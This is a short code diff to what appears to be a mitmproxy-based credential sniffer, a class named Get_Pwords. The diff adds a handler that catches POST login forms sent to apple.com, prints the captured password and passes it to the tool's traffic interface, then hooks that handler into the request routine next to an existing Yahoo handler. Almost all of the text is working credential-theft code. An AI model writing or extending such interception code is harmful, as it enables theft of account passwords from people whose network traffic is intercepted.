@@ -83,6 +83,13 @@ class Get_Pwords:
 		else:
 			pass
 
+	def get_apple(self, form, flow):
+		if "apple.com" in flow.request.headers['Host'] and form['login-password'] and form['login-appleId']:
+			print("account: apple, password:", form['login-password'])
+			return self.interface.read_traffic("apple", form['login-password'])
+		else:
+			pass
+
 	def request(self,flow):
 		if flow.request.urlencoded_form and flow.request.method == 'POST':
 			form = flow.request.urlencoded_form
@@ -126,6 +133,11 @@ class Get_Pwords:
 				self.get_yahoo(form, flow)
 			except KeyError as ke:
 				pass
+			try:
+				self.get_apple(form, flow)
+			except KeyError as ke:
+				pass
+
 
 				
 
